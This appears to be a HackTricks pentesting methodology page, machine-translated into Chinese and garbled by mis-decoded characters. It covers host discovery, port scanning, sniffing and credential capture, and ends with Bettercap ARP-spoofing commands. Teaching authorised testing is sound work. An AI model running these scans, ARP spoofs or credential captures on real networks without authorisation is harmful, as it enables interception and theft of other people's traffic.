# ç½‘ç»œæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**èµé‡‘çŒäººæç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œè¿™æ˜¯ä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**èµé‡‘çŒäººå¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬çš„[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## ä»å¤–éƒ¨å‘ç°ä¸»æœº

è¿™å°†æ˜¯ä¸€ä¸ªå…³äºå¦‚ä½•ä»**äº’è”ç½‘**ä¸­æ‰¾åˆ°**å“åº”çš„IPåœ°å€**çš„**ç®€çŸ­éƒ¨åˆ†**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ æœ‰ä¸€äº›**IPèŒƒå›´**ï¼ˆç”šè‡³å¯èƒ½æœ‰å‡ ä¸ª**èŒƒå›´**ï¼‰ï¼Œä½ åªéœ€è¦æ‰¾å‡º**å“ªäº›IPåœ°å€æ­£åœ¨å“åº”**ã€‚

### ICMP

è¿™æ˜¯å‘ç°ä¸»æœºæ˜¯å¦å¯åŠ¨çš„**æœ€ç®€å•**å’Œ**æœ€å¿«**çš„æ–¹æ³•ã€‚\
ä½ å¯ä»¥å°è¯•å‘é€ä¸€äº›**ICMP**æ•°æ®åŒ…å¹¶**æœŸæœ›å“åº”**ã€‚æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯å‘é€ä¸€ä¸ª**å›æ˜¾è¯·æ±‚**å¹¶æœŸæœ›å“åº”ã€‚ä½ å¯ä»¥ä½¿ç”¨ç®€å•çš„`ping`å‘½ä»¤æˆ–è€…ä½¿ç”¨`fping`å‘½ä»¤æ¥å¤„ç†**èŒƒå›´**ã€‚\
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨**nmap**å‘é€å…¶ä»–ç±»å‹çš„ICMPæ•°æ®åŒ…ï¼ˆè¿™å°†é¿å…å¸¸è§çš„ICMPå›æ˜¾è¯·æ±‚-å“åº”çš„è¿‡æ»¤å™¨ï¼‰ã€‚
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPç«¯å£å‘ç°

å¾ˆå¸¸è§çš„æƒ…å†µæ˜¯å‘ç°æ‰€æœ‰ç±»å‹çš„ICMPæ•°æ®åŒ…éƒ½è¢«è¿‡æ»¤äº†ã€‚é‚£ä¹ˆï¼Œä½ å¯ä»¥åšçš„å°±æ˜¯**å°è¯•æŸ¥æ‰¾å¼€æ”¾çš„ç«¯å£**æ¥æ£€æŸ¥ä¸»æœºæ˜¯å¦åœ¨çº¿ã€‚æ¯ä¸ªä¸»æœºæœ‰**65535ä¸ªç«¯å£**ï¼Œæ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ª"å¤§"çš„èŒƒå›´ï¼Œä½ **ä¸èƒ½**æµ‹è¯•æ¯ä¸ªä¸»æœºçš„**æ¯ä¸ªç«¯å£**æ˜¯å¦å¼€æ”¾ï¼Œé‚£å°†èŠ±è´¹å¤ªå¤šæ—¶é—´ã€‚\
å› æ­¤ï¼Œä½ éœ€è¦ä¸€ä¸ª**å¿«é€Ÿçš„ç«¯å£æ‰«æå™¨**ï¼ˆ[masscan](https://github.com/robertdavidgraham/masscan)ï¼‰å’Œä¸€ä¸ª**å¸¸ç”¨ç«¯å£çš„åˆ—è¡¨ï¼š**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨`nmap`æ‰§è¡Œè¿™ä¸€æ­¥éª¤ï¼Œä½†å®ƒé€Ÿåº¦è¾ƒæ…¢ï¼Œè€Œä¸”`nmap`åœ¨è¯†åˆ«ä¸»æœºä¸Šå­˜åœ¨é—®é¢˜ã€‚

### HTTPç«¯å£å‘ç°

è¿™åªæ˜¯ä¸€ä¸ªTCPç«¯å£å‘ç°ï¼Œå½“ä½ æƒ³è¦**ä¸“æ³¨äºå‘ç°HTTPæœåŠ¡**æ—¶éå¸¸æœ‰ç”¨ï¼š
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPç«¯å£å‘ç°

æ‚¨è¿˜å¯ä»¥å°è¯•æ£€æŸ¥ä¸€äº›**UDPç«¯å£æ˜¯å¦å¼€æ”¾**ï¼Œä»¥å†³å®šæ˜¯å¦åº”è¯¥å¯¹ä¸€ä¸ª**ä¸»æœº**ç»™äºˆæ›´å¤šå…³æ³¨ã€‚ç”±äºUDPæœåŠ¡é€šå¸¸ä¸ä¼šå¯¹å¸¸è§„çš„ç©ºUDPæ¢æµ‹æ•°æ®åŒ…åšå‡ºä»»ä½•å“åº”ï¼Œå› æ­¤å¾ˆéš¾ç¡®å®šç«¯å£æ˜¯è¢«è¿‡æ»¤è¿˜æ˜¯å¼€æ”¾çš„ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯å‘é€ä¸æ­£åœ¨è¿è¡Œçš„æœåŠ¡ç›¸å…³çš„æ•°æ®åŒ…ï¼Œä½†ç”±äºæ‚¨ä¸çŸ¥é“è¿è¡Œçš„æ˜¯å“ªä¸ªæœåŠ¡ï¼Œæ‚¨åº”è¯¥æ ¹æ®ç«¯å£å·å°è¯•æœ€æœ‰å¯èƒ½çš„æœåŠ¡ï¼š
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
ä¹‹å‰æåˆ°çš„nmapå‘½ä»¤å°†æµ‹è¯•**/24**èŒƒå›´å†…æ¯ä¸ªä¸»æœºçš„**å‰1000ä¸ªUDPç«¯å£**ï¼Œä½†å³ä½¿åªæœ‰è¿™æ ·ï¼Œä¹Ÿéœ€è¦**>20åˆ†é’Ÿ**ã€‚å¦‚æœéœ€è¦**æ›´å¿«çš„ç»“æœ**ï¼Œå¯ä»¥ä½¿ç”¨[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)ï¼š`./udp-proto-scanner.pl 199.66.11.53/24`ã€‚è¿™å°†å‘å®ƒä»¬çš„**é¢„æœŸç«¯å£**å‘é€è¿™äº›**UDPæ¢æµ‹**ï¼ˆå¯¹äº/24èŒƒå›´ï¼Œåªéœ€1åˆ†é’Ÿï¼‰ï¼š_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTPç«¯å£å‘ç°
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## WiFiæ¸—é€æµ‹è¯•

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä»½å…³äºå½“å‰å·²çŸ¥çš„WiFiæ”»å‡»çš„è¯¦ç»†æŒ‡å—ï¼š

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## ä»å†…éƒ¨å‘ç°ä¸»æœº

å¦‚æœæ‚¨åœ¨ç½‘ç»œå†…éƒ¨ï¼Œæ‚¨é¦–å…ˆæƒ³è¦åšçš„äº‹æƒ…ä¹‹ä¸€å°±æ˜¯**å‘ç°å…¶ä»–ä¸»æœº**ã€‚æ ¹æ®æ‚¨å¯ä»¥/æƒ³è¦åˆ¶é€ çš„**å™ªéŸ³ç¨‹åº¦**ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼š

### è¢«åŠ¨

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·è¢«åŠ¨åœ°å‘ç°è¿æ¥ç½‘ç»œå†…çš„ä¸»æœºï¼š
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### ä¸»åŠ¨

è¯·æ³¨æ„ï¼Œ[_**ä»å¤–éƒ¨å‘ç°ä¸»æœº**_](./#discovering-hosts-from-the-outside)ï¼ˆ_TCP/HTTP/UDP/SCTPç«¯å£å‘ç°_ï¼‰ä¸­æåˆ°çš„æŠ€æœ¯ä¹Ÿå¯ä»¥**åœ¨è¿™é‡Œåº”ç”¨**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šçš„äº‹æƒ…**ï¼š
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ä¸»åŠ¨ ICMP

è¯·æ³¨æ„ï¼Œ_ä»å¤–éƒ¨å‘ç°ä¸»æœº_ï¼ˆ[_**ICMP**_](./#icmp)ï¼‰ä¸­æåˆ°çš„æŠ€æœ¯ä¹Ÿå¯ä»¥**åº”ç”¨äºæ­¤å¤„**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šçš„äº‹æƒ…**ï¼š

* å¦‚æœæ‚¨**ping**ä¸€ä¸ª**å­ç½‘å¹¿æ’­åœ°å€**ï¼Œpingåº”è¯¥ä¼šåˆ°è¾¾**æ¯ä¸ªä¸»æœº**ï¼Œå®ƒä»¬å¯èƒ½ä¼šå¯¹**æ‚¨åšå‡ºå“åº”**ï¼š`ping -b 10.10.5.255`
* é€šè¿‡ping**ç½‘ç»œå¹¿æ’­åœ°å€**ï¼Œæ‚¨ç”šè‡³å¯ä»¥æ‰¾åˆ°**å…¶ä»–å­ç½‘ä¸­çš„ä¸»æœº**ï¼š`ping -b 255.255.255.255`
* ä½¿ç”¨`nmap`çš„`-PEPM`æ ‡å¿—æ‰§è¡Œä¸»æœºå‘ç°ï¼Œå‘é€**ICMPv4 echo**ã€**timestamp**å’Œ**å­ç½‘æ©ç è¯·æ±‚**ï¼š`nmap -PEPM -sP â€“vvv -n 10.12.5.0/24`

### **è¿œç¨‹å”¤é†’**

è¿œç¨‹å”¤é†’ç”¨äºé€šè¿‡**ç½‘ç»œæ¶ˆæ¯**å¯åŠ¨è®¡ç®—æœºã€‚ç”¨äºå¯åŠ¨è®¡ç®—æœºçš„é­”æœ¯æ•°æ®åŒ…åªæ˜¯ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå…¶ä¸­æä¾›äº†**MACç›®æ ‡åœ°å€**ï¼Œç„¶ååœ¨åŒä¸€ä¸ªæ•°æ®åŒ…ä¸­**é‡å¤16æ¬¡**ã€‚\
ç„¶åï¼Œè¿™ç§ç±»å‹çš„æ•°æ®åŒ…é€šå¸¸ä»¥**ä»¥å¤ªç½‘0x0842**æˆ–**UDPæ•°æ®åŒ…å‘é€åˆ°ç«¯å£9**çš„å½¢å¼å‘é€ã€‚\
å¦‚æœæœªæä¾›**\[MAC]**ï¼Œåˆ™æ•°æ®åŒ…å°†å‘é€åˆ°**å¹¿æ’­ä»¥å¤ªç½‘**ï¼ˆå¹¿æ’­MACå°†è¢«é‡å¤ï¼‰ã€‚
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## æ‰«æä¸»æœº

ä¸€æ—¦ä½ å‘ç°äº†æ‰€æœ‰ä½ æƒ³è¦æ·±å…¥æ‰«æçš„IPï¼ˆå¤–éƒ¨æˆ–å†…éƒ¨ï¼‰ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚

### TCP

* **å¼€æ”¾**ç«¯å£ï¼š_SYN --> SYN/ACK --> RST_
* **å…³é—­**ç«¯å£ï¼š_SYN --> RST/ACK_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> \[æ— å“åº”]_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> ICMPæ¶ˆæ¯_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

æ‰«æ UDP ç«¯å£æœ‰ä¸¤ç§é€‰é¡¹ï¼š

* å‘é€ä¸€ä¸ª **UDP æ•°æ®åŒ…** å¹¶æ£€æŸ¥æ˜¯å¦æ”¶åˆ° _**ICMP ä¸å¯è¾¾**_ çš„å“åº”ï¼Œå¦‚æœç«¯å£æ˜¯ **å…³é—­çš„**ï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒICMP å°†è¢« **è¿‡æ»¤**ï¼Œå› æ­¤æ‚¨å°†ä¸ä¼šæ”¶åˆ°ä»»ä½•å…³äºç«¯å£æ˜¯å…³é—­è¿˜æ˜¯æ‰“å¼€çš„ä¿¡æ¯ï¼‰ã€‚
* å‘é€ä¸€ä¸ª **æ ¼å¼åŒ–çš„æ•°æ®æŠ¥æ–‡** æ¥å¼•å‘ä¸€ä¸ªæ¥è‡ª **æœåŠ¡**ï¼ˆä¾‹å¦‚ DNSã€DHCPã€TFTP å’Œå…¶ä»–æœåŠ¡ï¼Œå¦‚ _nmap-payloads_ ä¸­æ‰€åˆ—ï¼‰çš„å“åº”ã€‚å¦‚æœæ”¶åˆ°ä¸€ä¸ª **å“åº”**ï¼Œåˆ™ç«¯å£æ˜¯ **æ‰“å¼€çš„**ã€‚

**Nmap** å°†ä½¿ç”¨ "-sV" æ¥ **æ··åˆä½¿ç”¨** è¿™ä¸¤ä¸ªé€‰é¡¹ï¼ˆUDP æ‰«æéå¸¸æ…¢ï¼‰ï¼Œä½†è¯·æ³¨æ„ï¼ŒUDP æ‰«ææ¯” TCP æ‰«æè¦æ…¢ï¼š
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPæ‰«æ

SCTPä¸TCPå’ŒUDPå¹¶åˆ—ã€‚è¯¥åè®®æ—¨åœ¨é€šè¿‡IPæä¾›**ç”µè¯**æ•°æ®çš„**ä¼ è¾“**ï¼Œå®ƒå¤åˆ¶äº†ä¿¡ä»¤ç³»ç»Ÿ7ï¼ˆSS7ï¼‰çš„è®¸å¤šå¯é æ€§ç‰¹æ€§ï¼Œå¹¶æ”¯æŒä¸€ä¸ªæ›´å¤§çš„åè®®æ—ï¼Œç§°ä¸ºSIGTRANã€‚SCTPå—åˆ°åŒ…æ‹¬IBM AIXã€Oracle Solarisã€HP-UXã€Linuxã€Cisco IOSå’ŒVxWorksåœ¨å†…çš„æ“ä½œç³»ç»Ÿçš„æ”¯æŒã€‚

nmapæä¾›äº†ä¸¤ç§ä¸åŒçš„SCTPæ‰«ææ–¹å¼ï¼š_-sY_å’Œ_-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSå’ŒIPSé€ƒé¿

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **æ›´å¤šçš„nmapé€‰é¡¹**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### æ­ç¤ºå†…éƒ¨IPåœ°å€

é…ç½®é”™è¯¯çš„è·¯ç”±å™¨ã€é˜²ç«å¢™å’Œç½‘ç»œè®¾å¤‡æœ‰æ—¶ä¼šä½¿ç”¨éå…¬å…±æºåœ°å€å¯¹ç½‘ç»œæ¢æµ‹è¿›è¡Œå“åº”ã€‚æ‚¨å¯ä»¥ä½¿ç”¨_tcpdump_æ¥è¯†åˆ«åœ¨æµ‹è¯•æœŸé—´ä»ç§æœ‰åœ°å€æ¥æ”¶åˆ°çš„æ•°æ®åŒ…ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒKali Linuxä¸­çš„_eth2_æ¥å£å¯ä»¥ä»å…¬å…±äº’è”ç½‘è®¿é—®ï¼ˆå¦‚æœæ‚¨åœ¨NATæˆ–é˜²ç«å¢™åé¢ï¼Œè¿™ç§ç±»å‹çš„æ•°æ®åŒ…å¯èƒ½ä¼šè¢«è¿‡æ»¤ï¼‰ã€‚
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## å—…æ¢

é€šè¿‡æŸ¥çœ‹æ•è·çš„å¸§å’Œæ•°æ®åŒ…ï¼Œæ‚¨å¯ä»¥äº†è§£IPèŒƒå›´ã€å­ç½‘å¤§å°ã€MACåœ°å€å’Œä¸»æœºåçš„è¯¦ç»†ä¿¡æ¯ã€‚å¦‚æœç½‘ç»œé…ç½®é”™è¯¯æˆ–äº¤æ¢æœºè´Ÿè½½è¿‡å¤§ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¢«åŠ¨ç½‘ç»œå—…æ¢æ¥æ•è·æ•æ„Ÿææ–™ã€‚

å¦‚æœä»¥å¤ªç½‘äº¤æ¢ç½‘ç»œé…ç½®æ­£ç¡®ï¼Œæ‚¨åªä¼šçœ‹åˆ°å¹¿æ’­å¸§å’Œå‘é€ç»™æ‚¨çš„MACåœ°å€çš„å†…å®¹ã€‚

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
ä¸€ä¸ªäººä¹Ÿå¯ä»¥é€šè¿‡SSHä¼šè¯åœ¨å®æ—¶ä¸­ä½¿ç”¨Wiresharkä½œä¸ºGUIæ¥æ•è·è¿œç¨‹æœºå™¨çš„æ•°æ®åŒ…ã€‚
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercapæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œæ¸—é€æµ‹è¯•å·¥å…·ï¼Œå®ƒæä¾›äº†è®¸å¤šæœ‰ç”¨çš„åŠŸèƒ½å’ŒåŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜åœ¨ç½‘ç»œç¯å¢ƒä¸­å‘ç°å’Œåˆ©ç”¨æ¼æ´ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›Bettercapçš„ä¸»è¦åŠŸèƒ½ï¼š

- **ARPæ¬ºéª—**ï¼šBettercapå¯ä»¥æ‰§è¡ŒARPæ¬ºéª—æ”»å‡»ï¼Œæ¬ºéª—ç›®æ ‡è®¾å¤‡å°†å…¶ç½‘ç»œæµé‡å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šã€‚è¿™ä½¿å¾—æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿç›‘è§†å’Œåˆ†æç›®æ ‡è®¾å¤‡çš„ç½‘ç»œæµé‡ã€‚

- **SSLä¸­é—´äººæ”»å‡»**ï¼šBettercapå¯ä»¥æ‰§è¡ŒSSLä¸­é—´äººæ”»å‡»ï¼Œæ¬ºéª—ç›®æ ‡è®¾å¤‡ä¸æœåŠ¡å™¨ä¹‹é—´çš„SSLè¿æ¥ã€‚è¿™ä½¿å¾—æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿæ‹¦æˆªå’ŒæŸ¥çœ‹ç›®æ ‡è®¾å¤‡ä¸æœåŠ¡å™¨ä¹‹é—´çš„åŠ å¯†é€šä¿¡ã€‚

- **DNSæ¬ºéª—**ï¼šBettercapå¯ä»¥æ‰§è¡ŒDNSæ¬ºéª—æ”»å‡»ï¼Œæ¬ºéª—ç›®æ ‡è®¾å¤‡å°†å…¶DNSè¯·æ±‚å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šã€‚è¿™ä½¿å¾—æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤ŸåŠ«æŒç›®æ ‡è®¾å¤‡çš„DNSæµé‡ï¼Œä»è€Œå¯ä»¥é‡å®šå‘ç›®æ ‡è®¾å¤‡åˆ°æ¶æ„ç½‘ç«™æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

- **æ¨¡å—åŒ–æ¡†æ¶**ï¼šBettercapæ˜¯ä¸€ä¸ªæ¨¡å—åŒ–çš„æ¡†æ¶ï¼Œå…è®¸ç”¨æˆ·æ ¹æ®éœ€è¦åŠ è½½å’Œä½¿ç”¨å„ç§æ’ä»¶å’Œæ¨¡å—ã€‚è¿™ä½¿å¾—æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿæ ¹æ®å…·ä½“çš„æ¸—é€æµ‹è¯•éœ€æ±‚æ¥å®šåˆ¶å’Œæ‰©å±•Bettercapçš„åŠŸèƒ½ã€‚

- **Webç•Œé¢**ï¼šBettercapæä¾›äº†ä¸€ä¸ªWebç•Œé¢ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡æµè§ˆå™¨è½»æ¾åœ°é…ç½®å’Œæ§åˆ¶å·¥å…·ã€‚è¿™ä½¿å¾—æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿæ›´åŠ æ–¹ä¾¿åœ°ä½¿ç”¨Bettercapï¼Œå¹¶ä¸”å¯ä»¥å®æ—¶ç›‘è§†å’Œåˆ†æç›®æ ‡è®¾å¤‡çš„ç½‘ç»œæµé‡ã€‚

æ€»ä¹‹ï¼ŒBettercapæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§ä¸”çµæ´»çš„ç½‘ç»œæ¸—é€æµ‹è¯•å·¥å…·ï¼Œå®ƒæä¾›äº†å¤šç§æ”»å‡»æŠ€æœ¯å’ŒåŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜å‘ç°å’Œåˆ©ç”¨ç›®æ ‡ç½‘ç»œä¸­çš„æ¼æ´ã€‚
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

æ˜¾è€Œæ˜“è§ã€‚

### æ•è·å‡­è¯

æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·å¦‚[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)ä»pcapæ–‡ä»¶æˆ–å®æ—¶æ¥å£ä¸­è§£æå‡­è¯ã€‚

## å±€åŸŸç½‘æ”»å‡»

### ARPæ¬ºéª—

ARPæ¬ºéª—æ˜¯æŒ‡å‘é€è™šå‡çš„ARPå“åº”ï¼Œä»¥æŒ‡ç¤ºæŸå°æœºå™¨çš„IPåœ°å€ä¸æˆ‘ä»¬çš„è®¾å¤‡çš„MACåœ°å€ç›¸å¯¹åº”ã€‚ç„¶åï¼Œå—å®³è€…å°†æ›´æ”¹ARPè¡¨ï¼Œå¹¶åœ¨æ¯æ¬¡æƒ³è¦ä¸ä¼ªé€ çš„IPåœ°å€é€šä¿¡æ—¶ä¸æˆ‘ä»¬çš„æœºå™¨è”ç³»ã€‚

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoofï¼ˆARPæ¬ºéª—ï¼‰**

Arpspoofæ˜¯ä¸€ç§ç½‘ç»œæ¬ºéª—æŠ€æœ¯ï¼Œé€šè¿‡ä¼ªé€ ARPï¼ˆåœ°å€è§£æåè®®ï¼‰å“åº”ï¼Œæ¬ºéª—ç›®æ ‡è®¾å¤‡ä¸ç½‘å…³ä¹‹é—´çš„é€šä¿¡ã€‚è¿™ç§æ”»å‡»æŠ€æœ¯å¯ä»¥ç”¨äºä¸­é—´äººæ”»å‡»ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿæ‹¦æˆªã€ç¯¡æ”¹æˆ–çªƒå–ç›®æ ‡è®¾å¤‡å’Œç½‘å…³ä¹‹é—´çš„é€šä¿¡æ•°æ®ã€‚

